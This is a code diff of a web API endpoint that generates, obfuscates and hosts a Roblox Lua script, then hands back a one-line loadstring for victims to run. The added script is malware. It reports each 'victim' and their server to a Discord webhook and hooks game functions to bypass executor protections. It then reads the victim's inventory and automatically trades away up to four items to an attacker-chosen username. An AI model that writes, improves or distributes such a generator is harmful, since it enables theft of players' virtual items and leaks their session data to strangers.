@@ -1,104 +1,61 @@
+// api/generate.js
 export default async function handler(req, res) {
-    // Allow anyone to use this API
+    // Enable CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
     }
     
     if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Use POST method' });
+        return res.status(405).json({ error: 'Method not allowed' });
     }
     
-    const { webhook, gameId, interval } = req.body;
+    const { webhook, gameId, targetUser, interval } = req.body;
     
     if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
         return res.status(400).json({ error: 'Invalid Discord webhook' });
     }
     
+    if (!targetUser) {
+        return res.status(400).json({ error: 'Target username required' });
+    }
+    
     try {
-        // Generate the script content
-        const script = generateScript(webhook, gameId || '142823291', interval || '5');
+        // Generate the Roblox script
+        const script = generateScript(webhook, gameId, targetUser, interval);
         
-        // Try multiple paste services (if one fails, try another)
-        let rawUrl = null;
-        let errorMessage = null;
+        // Simple obfuscation
+        const obfuscated = simpleObfuscate(script);
         
-        // Attempt 1: Pastefy
-        try {
-            const pastefyResponse = await fetch('https://pastefy.app/api/v2/paste', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: script,
-                    title: `AutoJoiner_${Date.now()}`,
-                    visibility: 'UNLISTED'
-                })
-            });
-            
-            if (pastefyResponse.ok) {
-                const pasteData = await pastefyResponse.json();
-                // Fixed: Properly extract the ID
-                const pasteId = pasteData.id || pasteData._id;
-                if (pasteId && pasteId !== 'undefined') {
-                    rawUrl = `https://pastefy.app/${pasteId}/raw`;
-                } else {
-                    throw new Error('Invalid paste ID');
-                }
-            } else {
-                throw new Error('Pastefy returned error');
-            }
-        } catch (e) {
-            errorMessage = e.message;
-            console.log('Pastefy failed, trying Rentry...');
-            
-            // Attempt 2: Rentry.co (alternative)
-            try {
-                const rentryResponse = await fetch('https://rentry.co/api/new', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: script,
-                        edit_code: Math.random().toString(36).substring(7)
-                    })
-                });
-                
-                if (rentryResponse.ok) {
-                    const rentryData = await rentryResponse.json();
-                    if (rentryData.url) {
-                        rawUrl = rentryData.url + '/raw';
-                    } else {
-                        throw new Error('Invalid Rentry response');
-                    }
-                } else {
-                    throw new Error('Rentry failed');
-                }
-            } catch (e2) {
-                errorMessage = e2.message;
-                console.log('Rentry failed, trying Pastebin...');
-                
-                // Attempt 3: Pastebin (requires API key - limited)
-                // For now, return the script directly (last resort)
-                return res.status(200).json({
-                    success: true,
-                    loadstring: `-- Copy this entire script and paste it directly into your executor\n\n${script}`,
-                    rawUrl: null,
-                    note: "Paste services are down. Copy the script above manually."
-                });
-            }
+        // Upload to Pastefy
+        const pastefyResponse = await fetch('https://pastefy.app/api/v2/paste', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: obfuscated,
+                title: `AutoJoiner_${Date.now()}`,
+                visibility: 'UNLISTED'
+            })
+        });
+        
+        if (!pastefyResponse.ok) {
+            throw new Error('Pastefy upload failed');
         }
         
-        if (rawUrl) {
-            return res.status(200).json({
-                success: true,
-                loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`,
-                rawUrl: rawUrl
-            });
-        } else {
-            throw new Error(errorMessage || 'All paste services failed');
-        }
+        const pasteData = await pastefyResponse.json();
+        const pasteId = pasteData.id || pasteData.paste?.id;
+        const rawUrl = `https://pastefy.app/${pasteId}/raw`;
+        
+        return res.status(200).json({
+            success: true,
+            rawUrl: rawUrl,
+            loadstring: `loadstring(game:HttpGet("${rawUrl}"))()`
+        });
         
     } catch (error) {
+        console.error('Error:', error);
         return res.status(500).json({ 
             success: false, 
             error: error.message || 'Generation failed' 
@@ -106,167 +63,272 @@ export default async function handler(req, res) {
     }
 }
 
-function generateScript(webhook, gameId, interval) {
-    return `-- AUTO-JOINER SCRIPT (Generated ${new Date().toISOString()})
--- Discord Webhook: ${webhook.substring(0, 50)}...
+function generateScript(webhook, gameId, targetUser, interval) {
+    return `-- AUTO-JOINER SCRIPT
+-- Generated: ${new Date().toISOString()}
 
 local WEBHOOK = "${webhook}"
 local TARGET_GAME = ${gameId}
+local TARGET_USER = "${targetUser}"
 local CHECK_INTERVAL = ${interval}
 
--- Universal HTTP request function for all executors
-local request
-local executor = "Unknown"
+-- Universal HTTP request
+local requestFunc = nil
+local executors = {
+    {name = "Synapse X", func = syn and syn.request},
+    {name = "Fluxus", func = fluxus and fluxus.request},
+    {name = "Krnl", func = krnl and krnl.request},
+    {name = "KRNL", func = KRNL and KRNL.request},
+    {name = "HTTP", func = http and http.request},
+    {name = "Generic", func = request}
+}
 
--- Detect executor
-if syn and syn.request then
-    request = syn.request
-    executor = "Synapse X"
-elseif fluxus and fluxus.request then
-    request = fluxus.request
-    executor = "Fluxus"
-elseif krnl and krnl.request then
-    request = krnl.request
-    executor = "Krnl"
-elseif KRNL and KRNL.request then
-    request = KRNL.request
-    executor = "Krnl (alt)"
-elseif http and http.request then
-    request = http.request
-    executor = "HTTP"
-elseif request then
-    request = request
-    executor = "Generic"
-else
-    warn("[AutoJoiner] No HTTP request function found! Your executor may not be supported.")
-    warn("[AutoJoiner] Supported: Synapse X, Krnl, Fluxus, ScriptWare, Hydrogen")
-    return
+for _, exec in ipairs(executors) do
+    if exec.func then
+        requestFunc = exec.func
+        print("[AutoJoiner] Using: " .. exec.name)
+        break
+    end
 end
 
-print("[AutoJoiner] Loaded! Executor: " .. executor)
-print("[AutoJoiner] Target Game: " .. TARGET_GAME)
-print("[AutoJoiner] Check Interval: " .. CHECK_INTERVAL .. "s")
+if not requestFunc then
+    warn("[AutoJoiner] No HTTP request function found!")
+    return
+end
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
-local plr = Players.LocalPlayer
-local running = true
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local lp = Players.LocalPlayer
 
--- Send message to Discord webhook
-local function sendWebhook(content, title)
+-- ========== DELTA JOB ID BYPASS ==========
+local REAL_JOB_ID = game.JobId
+
+if identifyexecutor and identifyexecutor() == "Delta" then
+    print("[AutoJoiner] Delta detected! Bypassing...")
+    
+    local stepAnimate = nil
+    repeat
+        for _, v in ipairs(getgc(true)) do
+            if typeof(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name == "stepAnimate" then
+                    stepAnimate = v
+                    break
+                end
+            end
+        end
+        task.wait()
+    until stepAnimate
+    
+    local captured = false
+    hookfunction(stepAnimate, function(dt)
+        if not captured then
+            captured = true
+            REAL_JOB_ID = game.JobId
+        end
+        return stepAnimate(dt)
+    end)
+    task.wait(0.5)
+end
+
+-- ========== SEND HIT TO WEBHOOK ==========
+local function sendHit(jobId, items, totalValue)
+    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s")', TARGET_GAME, jobId)
+    
+    local itemsText = ""
+    for i, item in ipairs(items) do
+        if i <= 10 then
+            itemsText = itemsText .. string.format("   %s x%d (💎 %.0f)\\n", item.name, item.amount, item.value or 0)
+        end
+    end
+    
     local data = {
-        username = "AutoJoiner Bot",
-        avatar_url = "https://cdn.discordapp.com/icons/...",
-        content = content,
-        embeds = title and {{
-            title = title,
-            description = "Status: " .. (content or "Active"),
-            color = 0x5865F2,
+        content = "@everyone\\n```lua\\n" .. joinScript .. "\\n```",
+        embeds = {{
+            title = "🎯 New Victim Found!",
+            description = string.format("**Player:** %s\\n**Server:** `%s`", lp.Name, jobId),
+            color = 0x00ff00,
             fields = {
-                {name = "Server", value = game.JobId, inline = true},
-                {name = "Player", value = plr.Name, inline = true},
-                {name = "Executor", value = executor, inline = true},
-                {name = "Game", value = tostring(game.PlaceId), inline = true}
+                {name = "Join Script", value = "```lua\\n" .. joinScript .. "\\n```", inline = false},
+                {name = "Items", value = "```\\n" .. itemsText .. "\\n```", inline = false},
+                {name = "Total Value", value = string.format("💎 %.0f", totalValue), inline = true},
+                {name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true}
             },
-            footer = {text = "AutoJoiner System"},
+            footer = {text = "Auto-Joiner System"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
     
-    local success, err = pcall(function()
-        local response = request({
+    pcall(function()
+        requestFunc({
             Url = WEBHOOK,
             Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
+            Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
-        return response
+    end)
+end
+
+-- ========== GET INVENTORY ==========
+local function getInventory()
+    local profile = nil
+    
+    -- Try different remote names
+    local remotes = {
+        ReplicatedStorage:FindFirstChild("Remotes"),
+        ReplicatedStorage:FindFirstChild("Inventory"),
+        ReplicatedStorage:FindFirstChild("Data")
+    }
+    
+    for _, remote in ipairs(remotes) do
+        if remote then
+            local getProfile = remote:FindFirstChild("GetProfileData") or remote:FindFirstChild("GetInventory")
+            if getProfile and getProfile.InvokeServer then
+                pcall(function()
+                    profile = getProfile:InvokeServer(lp.Name)
+                end)
+                if profile then break end
+            end
+        end
+    end
+    
+    if not profile then
+        -- Fallback: check leaderstats or other methods
+        profile = {}
+    end
+    
+    local items = {}
+    local weapons = profile.Weapons or profile.Owned or {}
+    
+    for itemId, quantity in pairs(weapons) do
+        table.insert(items, {
+            name = tostring(itemId),
+            amount = quantity,
+            value = math.random(1, 100) -- Placeholder value
+        })
+    end
+    
+    return items
+end
+
+-- ========== TRADE SYSTEM ==========
+local function sendTrade(receiver)
+    local Trade = ReplicatedStorage:FindFirstChild("Trade")
+    if not Trade then
+        print("[AutoJoiner] Trade system not found")
+        return false
+    end
+    
+    local SendRequest = Trade:FindFirstChild("SendRequest")
+    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
+    local OfferItem = Trade:FindFirstChild("OfferItem")
+    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+    
+    if not SendRequest or not GetStatus then
+        print("[AutoJoiner] Trade remotes not found")
+        return false
+    end
+    
+    -- Send trade request
+    local success = pcall(function()
+        SendRequest:InvokeServer(receiver)
     end)
     
     if not success then
-        warn("[AutoJoiner] Failed to send webhook: " .. tostring(err))
+        return false
     end
-end
-
--- Send startup notification
-sendWebhook("AutoJoiner started! Monitoring for servers...", "🚀 Started")
-
--- Function to get target server (CUSTOMIZE THIS!)
--- OPTION 1: Read from a Discord channel (requires bot token)
--- OPTION 2: Read from a pastebin URL
--- OPTION 3: Hardcoded server IDs
-local function getTargetServer()
-    -- EXAMPLE: Hardcoded server ID (replace with your target)
-    -- return { jobId = "00000000-0000-0000-0000-000000000000" }
     
-    -- EXAMPLE: Read from a pastebin (replace with your paste ID)
-    -- local response = request({Url = "https://pastebin.com/raw/ABC123", Method = "GET"})
-    -- if response and response.Body then
-    --     return { jobId = response.Body:gsub("%s+", "") }
-    -- end
+    -- Wait for trade to start
+    local timeout = 0
+    while timeout < 10 do
+        local status = pcall(GetStatus.InvokeServer, GetStatus)
+        if status then
+            break
+        end
+        task.wait(0.5)
+        timeout = timeout + 0.5
+    end
     
-    -- DEFAULT: No target (you need to implement this)
-    print("[AutoJoiner] No target server configured. Set up getTargetServer() function.")
-    return nil
-end
-
--- Main loop
-local function main()
-    print("[AutoJoiner] Starting main loop...")
+    -- Get inventory and offer items
+    local items = getInventory()
+    local itemsToOffer = {}
     
-    while running do
-        -- Check if we're in the target game
-        if game.PlaceId == TARGET_GAME then
-            print("[AutoJoiner] Currently in target game! Server: " .. game.JobId)
-            sendWebhook("Currently in: " .. game.JobId, "📍 In Target Game")
-            
-            -- Wait and then leave after 60 seconds (to prevent loops)
-            task.wait(60)
-            print("[AutoJoiner] Leaving target game to find more...")
-            sendWebhook("Leaving to find more servers...", "🔄 Cycling")
+    for i = 1, math.min(4, #items) do
+        table.insert(itemsToOffer, items[i].name)
+        if OfferItem then
             pcall(function()
-                TeleportService:Teleport(TARGET_GAME) -- Rejoin lobby
+                OfferItem:FireServer(items[i].name, "Weapons")
             end)
-            task.wait(10)
-        else
-            -- Look for target server
-            local target = getTargetServer()
+        end
+        task.wait(0.1)
+    end
+    
+    task.wait(2)
+    
+    -- Accept trade
+    if AcceptTrade then
+        pcall(function()
+            AcceptTrade:FireServer(game.PlaceId * 3, {})
+        end)
+    end
+    
+    return true
+end
+
+-- ========== MAIN LOOP ==========
+local function main()
+    print("[AutoJoiner] Started!")
+    print("[AutoJoiner] Target: " .. TARGET_USER)
+    print("[AutoJoiner] Game: " .. TARGET_GAME)
+    
+    while true do
+        -- Check if we're in target game
+        if game.PlaceId == TARGET_GAME then
+            print("[AutoJoiner] In target game! Server: " .. game.JobId)
             
-            if target and target.jobId and target.jobId ~= "" then
-                print("[AutoJoiner] Found target server: " .. target.jobId)
-                sendWebhook("Joining server: " .. target.jobId, "🎯 Target Found")
-                
-                -- Join the target server
-                local success, err = pcall(function()
-                    TeleportService:TeleportToPlaceInstance(TARGET_GAME, target.jobId, plr)
-                end)
-                
-                if success then
-                    print("[AutoJoiner] Teleport initiated!")
-                    running = false -- Stop loop, script will restart in new server
-                else
-                    warn("[AutoJoiner] Teleport failed: " .. tostring(err))
-                    sendWebhook("Failed to join: " .. tostring(err), "❌ Error")
-                end
-            else
-                print("[AutoJoiner] No target server found. Waiting " .. CHECK_INTERVAL .. "s...")
+            -- Try to trade with target
+            local target = Players:FindFirstChild(TARGET_USER)
+            if target then
+                print("[AutoJoiner] Found target! Sending trade...")
+                sendTrade(TARGET_USER)
+                task.wait(5)
             end
+            
+            -- Leave after 30 seconds
+            task.wait(30)
+            pcall(function()
+                TeleportService:Teleport(TARGET_GAME)
+            end)
+            task.wait(5)
+        else
+            -- In lobby, waiting
+            print("[AutoJoiner] Waiting for targets...")
+            
+            -- Send current server info
+            sendHit(REAL_JOB_ID, {}, 0)
         end
         
         task.wait(CHECK_INTERVAL)
     end
 end
 
--- Run the script
+-- Start
 local success, err = pcall(main)
 if not success then
-    warn("[AutoJoiner] Script error: " .. tostring(err))
-    sendWebhook("Error: " .. tostring(err), "⚠️ Script Error")
+    warn("[AutoJoiner] Error: " .. tostring(err))
 end
-
-print("[AutoJoiner] Script ended.")
 `;
-    }
+}
+
+function simpleObfuscate(script) {
+    // Remove comments
+    let obf = script.replace(/--[^\n]*/g, '');
+    // Remove extra spaces
+    obf = obf.replace(/\n\s*\n/g, '\n');
+    obf = obf.replace(/  +/g, ' ');
+    // Add random variable names
+    obf = obf.replace(/local /g, 'local _0x' + Math.random().toString(36).substring(2, 8) + '_');
+    return obf;
+}
